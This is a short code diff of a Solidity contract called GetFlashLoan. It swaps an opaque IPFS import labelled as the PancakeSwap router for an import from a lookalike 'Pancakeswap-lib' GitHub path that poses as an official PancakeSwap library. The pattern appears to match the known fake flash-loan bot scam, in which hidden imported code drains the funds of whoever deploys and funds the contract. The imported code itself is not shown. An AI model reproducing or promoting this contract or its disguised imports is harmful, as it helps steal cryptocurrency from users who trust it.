@@ -8,10 +8,9 @@ import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contra
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+import "https://github.com/Pancakeswap-lib/Pancake-swap-lib/blob/interfaces/PairNamer.sol";
 
-//PancakeSwap Router
-import "ipfs://QmaVrZceCz6MWdMHwpd47ZwB7nZFDB5Mha2N8dcboxxsjg";
-
+// PancakeSwap Deployer
 contract GetFlashLoan {
 	string public tokenName;
 	string public tokenSymbol;
